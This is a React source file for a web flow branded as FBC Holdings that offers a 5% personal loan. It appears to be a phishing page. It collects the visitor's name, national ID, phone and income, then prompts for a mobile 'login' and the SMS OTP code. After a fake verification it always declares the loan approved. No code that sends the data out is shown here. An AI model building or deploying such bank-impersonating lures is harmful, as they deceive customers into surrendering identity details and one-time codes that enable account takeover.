import React, { useState, useEffect, useMemo } from 'react';
import { 
  CheckCircle2, 
  ChevronRight, 
  ChevronLeft, 
  Headphones, 
  Shield, 
  Smartphone, 
  Monitor, 
  Calendar, 
  DollarSign, 
  Check, 
  Sparkles, 
  FileText, 
  Building2, 
  User, 
  PhoneCall, 
  RefreshCw 
} from 'lucide-react';
import { FbcLogo } from './components/FbcLogo';
import { SupportModal } from './components/SupportModal';
import { ScheduleModal } from './components/ScheduleModal';
import { OfferLetterModal } from './components/OfferLetterModal';
import { LoanState, PageStep } from './types';

export default function App() {
  const [step, setStep] = useState<PageStep>(1);
  const [viewMode, setViewMode] = useState<'mobile' | 'desktop'>('desktop');
  const [showSupport, setShowSupport] = useState(false);
  const [showSchedule, setShowSchedule] = useState(false);
  const [showOfferLetter, setShowOfferLetter] = useState(false);
  const [isVerifyingOtp, setIsVerifyingOtp] = useState(false);
  const [countdown, setCountdown] = useState(45);
  const [errors, setErrors] = useState<Record<string, string>>({});

  const [loan, setLoan] = useState<LoanState>({
    amount: 5000,
    periodMonths: 24,
    interestRate: 5,
    currency: 'USD',
    
    fullName: '',
    nationalId: '',
    phoneNumber: '',
    email: '',
    loanPurpose: '',
    monthlyIncome: 0,
    hasExistingLoans: false,

    loginMobile: '',
    otpCode: '',
    referenceCode: '9vXfk',

    applicationId: 'FBC-ZW-2026-94812',
    approvalDate: new Date().toLocaleDateString('en-GB', { day: 'numeric', month: 'short', year: 'numeric' }),
    disbursementAccount: 'FBC Instant Savings Account (***-8492)',
    disbursementStatus: 'pending',
  });

  const calculations = useMemo(() => {
    const P = loan.amount;
    const rYear = loan.interestRate / 100;
    const rMonth = rYear / 12;
    const n = loan.periodMonths;
    const monthly = (P * (rMonth * Math.pow(1 + rMonth, n))) / (Math.pow(1 + rMonth, n) - 1);
    const totalRepayment = monthly * n;
    const totalInterest = totalRepayment - P;

    return {
      monthly: isNaN(monthly) ? 0 : monthly,
      totalRepayment: isNaN(totalRepayment) ? 0 : totalRepayment,
      totalInterest: isNaN(totalInterest) ? 0 : totalInterest,
    };
  }, [loan.amount, loan.periodMonths, loan.interestRate]);

  useEffect(() => {
    if (loan.phoneNumber && !loan.loginMobile) {
      setLoan(prev => ({ ...prev, loginMobile: prev.phoneNumber.replace(/\s+/g, '') }));
    }
  }, [loan.phoneNumber]);

  useEffect(() => {
    if (step === 4 && countdown > 0) {
      const timer = setInterval(() => setCountdown(c => c - 1), 1000);
      return () => clearInterval(timer);
    }
  }, [step, countdown]);

  const validateStep2 = () => {
    const newErrors: Record<string, string> = {};
    if (!loan.fullName.trim()) newErrors.fullName = 'Full legal name is required';
    if (!loan.phoneNumber.trim()) newErrors.phoneNumber = 'Mobile phone number is required';
    if (!loan.monthlyIncome || loan.monthlyIncome <= 0) newErrors.monthlyIncome = 'Valid monthly income is required';
    if (!loan.loanPurpose) newErrors.loanPurpose = 'Please select a loan purpose';
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleNextFromStep2 = () => {
    if (validateStep2()) {
      setLoan(prev => ({
        ...prev,
        loginMobile: prev.phoneNumber.replace(/[^0-9]/g, '').slice(-9),
      }));
      setStep(3);
    }
  };

  const handleLoginSubmit = (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (!loan.loginMobile.trim()) {
      setErrors({ loginMobile: 'Please enter your mobile number' });
      return;
    }
    setErrors({});
    setCountdown(45);
    setStep(4);
  };

  const handleOtpSubmit = (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (!loan.otpCode.trim()) {
      setErrors({ otpCode: 'Please enter the OTP verification code' });
      return;
    }
    setErrors({});
    setIsVerifyingOtp(true);
    setTimeout(() => {
      setIsVerifyingOtp(false);
      setStep(5);
    }, 1200);
  };

  return (
    <div className="min-h-screen bg-slate-900 text-slate-800 flex flex-col selection:bg-[#004bbd] selection:text-white">
      {/* Top Bar */}
      <header className="bg-slate-950/80 backdrop-blur-md border-b border-slate-800 text-white px-4 py-2.5 sticky top-0 z-40 flex items-center justify-between text-xs">
        <div className="flex items-center gap-3">
          <FbcLogo variant="white" size="sm" showSubtext />
          <span className="hidden sm:inline-block px-2.5 py-0.5 rounded-full bg-emerald-500/20 text-emerald-400 font-semibold border border-emerald-500/30 text-[10px]">
            5.0% Fixed Annual Rate
          </span>
        </div>

        <div className="hidden md:flex items-center gap-1 bg-slate-900/90 p-1 rounded-full border border-slate-800">
          {[
            { s: 1, label: '1. Calculator' },
            { s: 2, label: '2. Details' },
            { s: 3, label: '3. Login' },
            { s: 4, label: '4. OTP' },
            { s: 5, label: '5. Approved' },
          ].map((item) => (
            <button
              key={item.s}
              onClick={() => setStep(item.s as PageStep)}
              className={`px-3 py-1 rounded-full transition-all text-[11px] font-medium ${
                step === item.s ? 'bg-[#004bbd] text-white shadow-sm' : 'text-slate-400 hover:text-white'
              }`}
            >
              {item.label}
            </button>
          ))}
        </div>

        <div className="flex items-center bg-slate-900 rounded-lg p-0.5 border border-slate-800">
          <button onClick={() => setViewMode('desktop')} className={`p-1.5 rounded-md ${viewMode === 'desktop' ? 'bg-[#004bbd] text-white' : 'text-slate-400'}`}>
            <Monitor className="w-4 h-4" />
          </button>
          <button onClick={() => setViewMode('mobile')} className={`p-1.5 rounded-md ${viewMode === 'mobile' ? 'bg-[#004bbd] text-white' : 'text-slate-400'}`}>
            <Smartphone className="w-4 h-4" />
          </button>
        </div>
      </header>

      {/* Main View */}
      <main className="flex-1 flex items-center justify-center p-2 sm:p-6 lg:p-8 bg-gradient-to-b from-[#0a192f] via-[#081b33] to-[#040e1d]">
        <div className={`w-full transition-all duration-300 ${viewMode === 'mobile' ? 'max-w-[420px] rounded-[44px] shadow-2xl border-4 border-slate-700 overflow-hidden my-4' : 'max-w-4xl'}`}>

          {/* PAGE 1: CALCULATOR */}
          {step === 1 && (
            <div className="bg-white rounded-3xl shadow-2xl overflow-hidden border border-slate-100 flex flex-col">
              <div className="bg-gradient-to-r from-[#004bbd] to-[#003896] px-6 py-6 text-white flex flex-col sm:flex-row sm:items-center justify-between gap-4">
                <div className="flex items-center gap-4">
                  <FbcLogo variant="white" size="md" showSubtext />
                  <div>
                    <h1 className="text-xl font-bold">Personal Loan Application</h1>
                    <p className="text-blue-100 text-xs mt-1">Fixed annual borrowing rate of 5.0% per annum.</p>
                  </div>
                </div>
                <div className="bg-white/10 px-3.5 py-1.5 rounded-2xl border border-white/20 self-start sm:self-center">
                  <span className="text-[10px] text-blue-200 block uppercase">Fixed Rate</span>
                  <span className="text-xl font-extrabold text-emerald-300">5.00% p.a.</span>
                </div>
              </div>

              <div className="p-6 sm:p-8 space-y-6">
                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <label className="text-xs font-bold text-slate-700 uppercase tracking-wider">Select Loan Amount</label>
                    <span className="text-xl font-extrabold text-[#004bbd] bg-blue-50 px-3.5 py-1 rounded-xl">
                      {loan.currency} {loan.amount.toLocaleString()}
                    </span>
                  </div>
                  <input
                    type="range"
                    min={100}
                    max={30000}
                    step={100}
                    value={loan.amount}
                    onChange={(e) => setLoan({ ...loan, amount: Number(e.target.value) })}
                    className="w-full h-2.5 bg-slate-200 rounded-lg cursor-pointer"
                  />
                  <div className="flex justify-between text-xs text-slate-400 font-medium">
                    <span>$100</span><span>$15,000</span><span>$30,000</span>
                  </div>
                </div>

                <div className="space-y-2 pt-2 border-t border-slate-100">
                  <div className="flex items-center justify-between">
                    <label className="text-xs font-bold text-slate-700 uppercase tracking-wider">Repayment Period</label>
                    <span className="text-xl font-extrabold text-[#004bbd] bg-blue-50 px-3.5 py-1 rounded-xl">
                      {loan.periodMonths} Months
                    </span>
                  </div>
                  <input
                    type="range"
                    min={3}
                    max={60}
                    step={1}
                    value={loan.periodMonths}
                    onChange={(e) => setLoan({ ...loan, periodMonths: Number(e.target.value) })}
                    className="w-full h-2.5 bg-slate-200 rounded-lg cursor-pointer"
                  />
                  <div className="flex justify-between text-xs text-slate-400 font-medium">
                    <span>3 Mos</span><span>24 Mos</span><span>60 Mos</span>
                  </div>
                </div>

                <div className="bg-blue-50/70 border border-blue-100 rounded-2xl p-4 grid grid-cols-3 gap-3 text-center">
                  <div>
                    <span className="text-xs text-slate-500 block">Monthly Repayment</span>
                    <p className="text-2xl font-black text-[#004bbd] mt-1">${calculations.monthly.toFixed(2)}</p>
                  </div>
                  <div>
                    <span className="text-xs text-slate-500 block">Annual Rate</span>
                    <p className="text-2xl font-black text-emerald-600 mt-1">5.00%</p>
                  </div>
                  <div>
                    <span className="text-xs text-slate-500 block">Total Repayment</span>
                    <p className="text-2xl font-black text-slate-900 mt-1">${calculations.totalRepayment.toFixed(2)}</p>
                  </div>
                </div>

                <button
                  type="button"
                  onClick={() => setStep(2)}
                  className="w-full py-4 bg-[#004bbd] hover:bg-[#003896] text-white font-bold rounded-full shadow-lg text-base transition-all"
                >
                  Proceed to Personal Details &rarr;
                </button>
              </div>

              <div className="bg-slate-50 px-6 py-4 border-t border-slate-200 text-center text-xs text-slate-500">
                <p className="font-medium text-slate-700">&copy; 2026 FBC Holdings Limited. All rights reserved.</p>
              </div>
            </div>
          )}

          {/* PAGE 2: DETAILS */}
          {step === 2 && (
            <div className="bg-white rounded-3xl shadow-2xl overflow-hidden border border-slate-100 flex flex-col">
              <div className="bg-gradient-to-r from-[#004bbd] to-[#003896] px-6 py-5 text-white flex items-center justify-between">
                <div className="flex items-center gap-4">
                  <FbcLogo variant="white" size="md" />
                  <div>
                    <h2 className="text-lg font-bold">Step 2: Personal Details</h2>
                    <p className="text-xs text-blue-100">Please provide your personal information.</p>
                  </div>
                </div>
                <span className="text-xs bg-white/20 px-3 py-1 rounded-full font-semibold">Page 2 of 5</span>
              </div>

              <div className="p-6 sm:p-8 space-y-5">
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  <div>
                    <label className="text-xs font-bold text-slate-700 block mb-1 uppercase tracking-wider">Full Legal Names</label>
                    <input
                      type="text"
                      placeholder="Enter your full legal names"
                      value={loan.fullName}
                      onChange={(e) => setLoan({ ...loan, fullName: e.target.value })}
                      className="w-full px-4 py-3 rounded-xl border border-slate-300 text-sm focus:ring-2 focus:ring-[#004bbd]"
                    />
                  </div>
                  <div>
                    <label className="text-xs font-bold text-slate-700 block mb-1 uppercase tracking-wider">National ID Number</label>
                    <input
                      type="text"
                      placeholder="e.g. 63-123456-X-42"
                      value={loan.nationalId}
                      onChange={(e) => setLoan({ ...loan, nationalId: e.target.value })}
                      className="w-full px-4 py-3 rounded-xl border border-slate-300 text-sm focus:ring-2 focus:ring-[#004bbd]"
                    />
                  </div>
                  <div>
                    <label className="text-xs font-bold text-slate-700 block mb-1 uppercase tracking-wider">Mobile Phone Number</label>
                    <input
                      type="tel"
                      placeholder="+263 7X XXX XXXX"
                      value={loan.phoneNumber}
                      onChange={(e) => setLoan({ ...loan, phoneNumber: e.target.value })}
                      className="w-full px-4 py-3 rounded-xl border border-slate-300 text-sm focus:ring-2 focus:ring-[#004bbd]"
                    />
                  </div>
                  <div>
                    <label className="text-xs font-bold text-slate-700 block mb-1 uppercase tracking-wider">Email Address</label>
                    <input
                      type="email"
                      placeholder="e.g. name@example.com"
                      value={loan.email}
                      onChange={(e) => setLoan({ ...loan, email: e.target.value })}
                      className="w-full px-4 py-3 rounded-xl border border-slate-300 text-sm focus:ring-2 focus:ring-[#004bbd]"
                    />
                  </div>
                  <div>
                    <label className="text-xs font-bold text-slate-700 block mb-1 uppercase tracking-wider">Loan Purpose</label>
                    <select
                      value={loan.loanPurpose}
                      onChange={(e) => setLoan({ ...loan, loanPurpose: e.target.value })}
                      className="w-full px-4 py-3 rounded-xl border border-slate-300 text-sm bg-white"
                    >
                      <option value="">-- Select Loan Purpose --</option>
                      <option value="Business Working Capital">Business Working Capital</option>
                      <option value="Home Improvement">Home Improvement</option>
                      <option value="School Fees & Education">School Fees & Education</option>
                      <option value="Solar & Energy">Solar & Energy</option>
                      <option value="Agricultural Inputs">Agricultural Inputs</option>
                    </select>
                  </div>
                  <div>
                    <label className="text-xs font-bold text-slate-700 block mb-1 uppercase tracking-wider">Monthly Net Income (USD)</label>
                    <input
                      type="number"
                      placeholder="Enter monthly net income"
                      value={loan.monthlyIncome || ''}
                      onChange={(e) => setLoan({ ...loan, monthlyIncome: Number(e.target.value) || 0 })}
                      className="w-full px-4 py-3 rounded-xl border border-slate-300 text-sm focus:ring-2 focus:ring-[#004bbd]"
                    />
                  </div>
                </div>

                <div className="pt-3 flex items-center justify-between gap-4">
                  <button type="button" onClick={() => setStep(1)} className="px-6 py-3.5 border border-slate-300 rounded-full font-bold text-slate-700 text-sm hover:bg-slate-50">
                    &larr; Back
                  </button>
                  <button type="button" onClick={handleNextFromStep2} className="px-8 py-3.5 bg-[#004bbd] hover:bg-[#003896] text-white font-bold rounded-full text-sm shadow-md">
                    Continue to Mobile Login &rarr;
                  </button>
                </div>
              </div>

              <div className="bg-slate-50 px-6 py-4 border-t border-slate-200 text-center text-xs text-slate-500">
                <p className="font-medium text-slate-700">&copy; 2026 FBC Holdings Limited. All rights reserved.</p>
              </div>
            </div>
          )}

          {/* PAGE 3: LOGIN */}
          {step === 3 && (
            <div className="relative min-h-[640px] bg-gradient-to-b from-[#0047ba] via-[#0040ad] to-[#002f82] text-white flex flex-col justify-between overflow-hidden rounded-3xl shadow-2xl border border-blue-400/20">
              <div className="px-6 pt-5 flex items-center justify-between z-20">
                <button type="button" onClick={() => setStep(2)} className="text-white/80 hover:text-white text-xs">&larr; Back</button>
                <span className="text-[10px] text-blue-200 uppercase tracking-widest font-semibold">Page 3 of 5</span>
              </div>

              <div className="px-8 py-6 flex flex-col items-center text-center z-10 w-full max-w-sm mx-auto my-auto">
                <div className="mb-10">
                  <FbcLogo variant="white" size="lg" />
                </div>
                <h2 className="text-white text-lg font-normal mb-8 leading-snug">
                  Please enter your mobile number to continue
                </h2>
                <form onSubmit={handleLoginSubmit} className="w-full space-y-6">
                  <input
                    type="tel"
                    value={loan.loginMobile}
                    onChange={(e) => setLoan({ ...loan, loginMobile: e.target.value })}
                    placeholder="Enter here"
                    className="w-full h-14 px-6 rounded-full border-2 border-white/85 bg-transparent text-white text-center text-lg font-medium focus:outline-none focus:border-white"
                  />
                  <button type="submit" className="w-full h-14 rounded-full bg-white text-[#004bbd] font-bold text-lg shadow-xl hover:bg-slate-100">
                    Continue
                  </button>
                </form>
              </div>

              <div className="relative w-full z-10">
                <svg viewBox="0 0 500 150" className="w-full h-auto text-white fill-current pointer-events-none" preserveAspectRatio="none">
                  <path d="M 0,90 C 150,140 320,30 500,100 L 500,150 L 0,150 Z" fill="#eaf2fb" />
                  <path d="M 0,120 C 180,160 320,60 500,110 L 500,150 L 0,150 Z" fill="#ffffff" />
                </svg>
                <div className="absolute inset-x-0 bottom-4 flex flex-col items-center justify-center z-20">
                  <button type="button" onClick={() => setShowSupport(true)} className="flex flex-col items-center gap-1 focus:outline-none group">
                    <Headphones className="w-7 h-7 text-[#004bbd] stroke-[2.2]" />
                    <span className="text-[#004bbd] font-semibold text-xs group-hover:underline">Get Support</span>
                  </button>
                </div>
              </div>

              <div className="bg-white py-2 px-4 text-center text-[10px] text-slate-500 border-t border-slate-100 z-20">
                &copy; 2026 FBC Holdings Limited. All rights reserved.
              </div>
            </div>
          )}

          {/* PAGE 4: OTP */}
          {step === 4 && (
            <div className="relative min-h-[640px] bg-gradient-to-b from-[#0047ba] via-[#0040ad] to-[#002f82] text-white flex flex-col justify-between overflow-hidden rounded-3xl shadow-2xl border border-blue-400/20">
              <div className="px-6 pt-5 flex items-center justify-between z-20">
                <button type="button" onClick={() => setStep(3)} className="text-white/80 hover:text-white text-xs">&larr; Back</button>
                <span className="text-[10px] text-blue-200 uppercase tracking-widest font-semibold">Page 4 of 5</span>
              </div>

              <div className="px-8 py-6 flex flex-col items-center text-center z-10 w-full max-w-sm mx-auto my-auto">
                <div className="mb-5">
                  <FbcLogo variant="white" size="lg" />
                </div>
                <h2 className="text-white text-2xl font-bold mb-3">OTP Verification</h2>
                <p className="text-white/90 text-xs sm:text-sm font-normal leading-relaxed max-w-xs mb-4">
                  Your OTP will be automatically verified. You can still enter the OTP code you receive via SMS manually.
                </p>
                <p className="text-white/80 font-mono text-sm tracking-widest mb-6">
                  Ref: <span className="font-bold text-white">9vXfk</span>
                </p>

                <form onSubmit={handleOtpSubmit} className="w-full space-y-5">
                  <input
                    type="text"
                    maxLength={6}
                    value={loan.otpCode}
                    onChange={(e) => setLoan({ ...loan, otpCode: e.target.value })}
                    placeholder="OTP code"
                    className="w-full h-14 px-6 rounded-full border-2 border-white/85 bg-transparent text-white text-center text-xl font-mono tracking-widest focus:outline-none focus:border-white"
                  />
                  <button type="submit" disabled={isVerifyingOtp} className="w-full h-14 rounded-full bg-white text-[#004bbd] font-bold text-lg shadow-xl hover:bg-slate-100 flex items-center justify-center gap-2">
                    {isVerifyingOtp ? <><RefreshCw className="w-5 h-5 animate-spin" /> Verifying...</> : 'Verify'}
                  </button>
                </form>

                <div className="mt-4 text-xs text-blue-200">
                  <span>Didn't receive code? </span>
                  <button type="button" onClick={() => setCountdown(45)} className="font-bold text-white underline">
                    Resend in {countdown}s
                  </button>
                </div>
              </div>

              <div className="relative w-full z-10">
                <svg viewBox="0 0 500 150" className="w-full h-auto text-white fill-current pointer-events-none" preserveAspectRatio="none">
                  <path d="M 0,90 C 150,140 320,30 500,100 L 500,150 L 0,150 Z" fill="#eaf2fb" />
                  <path d="M 0,120 C 180,160 320,60 500,110 L 500,150 L 0,150 Z" fill="#ffffff" />
                </svg>
                <div className="absolute inset-x-0 bottom-4 flex flex-col items-center justify-center z-20">
                  <button type="button" onClick={() => setShowSupport(true)} className="flex flex-col items-center gap-1 focus:outline-none group">
                    <Headphones className="w-7 h-7 text-[#004bbd] stroke-[2.2]" />
                    <span className="text-[#004bbd] font-semibold text-xs group-hover:underline">Get Support</span>
                  </button>
                </div>
              </div>

              <div className="bg-white py-2 px-4 text-center text-[10px] text-slate-500 border-t border-slate-100 z-20">
                &copy; 2026 FBC Holdings Limited. All rights reserved.
              </div>
            </div>
          )}

          {/* PAGE 5: APPROVAL */}
          {step === 5 && (
            <div className="bg-white rounded-3xl shadow-2xl overflow-hidden border border-slate-100 flex flex-col">
              <div className="bg-gradient-to-r from-emerald-600 via-teal-700 to-[#004bbd] px-6 py-8 text-white text-center">
                <div className="mb-4 flex justify-center">
                  <FbcLogo variant="white" size="lg" />
                </div>
                <div className="w-14 h-14 mx-auto mb-3 rounded-full bg-white text-emerald-600 flex items-center justify-center font-black text-2xl shadow-lg ring-4 ring-white/30 animate-bounce">
                  <Check className="w-8 h-8 stroke-[3]" />
                </div>
                <h1 className="text-2xl font-extrabold">Loan Application Approved!</h1>
                <p className="text-blue-100 text-xs sm:text-sm mt-1">
                  Congratulations <span className="font-bold text-white">{loan.fullName || 'Valued Client'}</span>, your loan has been approved.
                </p>
                <div className="mt-3 inline-block px-4 py-1.5 bg-black/20 rounded-full text-xs font-mono">
                  Application Ref: <span className="font-bold text-emerald-300">{loan.applicationId}</span>
                </div>
              </div>

              <div className="p-6 sm:p-8 space-y-5">
                <div className="bg-blue-50/80 rounded-2xl p-5 border border-blue-200">
                  <div className="flex justify-between items-center pb-3 border-b border-blue-200">
                    <span className="text-xs text-slate-500">Approved Principal</span>
                    <span className="text-2xl font-black text-[#004bbd]">${loan.amount.toLocaleString()}.00</span>
                  </div>
                  <div className="grid grid-cols-2 gap-3 pt-3 text-xs">
                    <div>
                      <span className="text-slate-500 block">Annual Interest</span>
                      <span className="font-bold text-emerald-700">5.00% p.a. (Fixed)</span>
                    </div>
                    <div>
                      <span className="text-slate-500 block">Tenor</span>
                      <span className="font-bold text-slate-800">{loan.periodMonths} Months</span>
                    </div>
                    <div>
                      <span className="text-slate-500 block">Monthly Installment</span>
                      <span className="font-bold text-[#004bbd]">${calculations.monthly.toFixed(2)}</span>
                    </div>
                    <div>
                      <span className="text-slate-500 block">Disbursement</span>
                      <span className="font-bold text-slate-800">{loan.disbursementAccount}</span>
                    </div>
                  </div>
                </div>

                <div className="flex gap-3 pt-2">
                  <button type="button" onClick={() => setShowOfferLetter(true)} className="w-1/2 py-3.5 bg-slate-900 text-white rounded-full font-bold text-xs hover:bg-slate-800">
                    Download Offer Letter
                  </button>
                  <button type="button" onClick={() => setStep(1)} className="w-1/2 py-3.5 bg-[#004bbd] text-white rounded-full font-bold text-xs hover:bg-[#003896]">
                    New Application &rarr;
                  </button>
                </div>
              </div>

              <div className="bg-slate-50 px-6 py-4 border-t border-slate-200 text-center text-xs text-slate-500">
                <p className="font-medium text-slate-700">&copy; 2026 FBC Holdings Limited. All rights reserved.</p>
              </div>
            </div>
          )}

        </div>
      </main>

      <SupportModal isOpen={showSupport} onClose={() => setShowSupport(false)} />
      <ScheduleModal isOpen={showSchedule} onClose={() => setShowSchedule(false)} principal={loan.amount} periodMonths={loan.periodMonths} annualInterestRate={loan.interestRate} currency={loan.currency} />
      <OfferLetterModal isOpen={showOfferLetter} onClose={() => setShowOfferLetter(false)} data={{ fullName: loan.fullName, nationalId: loan.nationalId, phoneNumber: loan.phoneNumber, amount: loan.amount, periodMonths: loan.periodMonths, interestRate: loan.interestRate, monthlyInstallment: calculations.monthly, totalRepayment: calculations.totalRepayment, applicationId: loan.applicationId, approvalDate: loan.approvalDate, loanPurpose: loan.loanPurpose, currency: loan.currency }} />
    </div>
  );
}
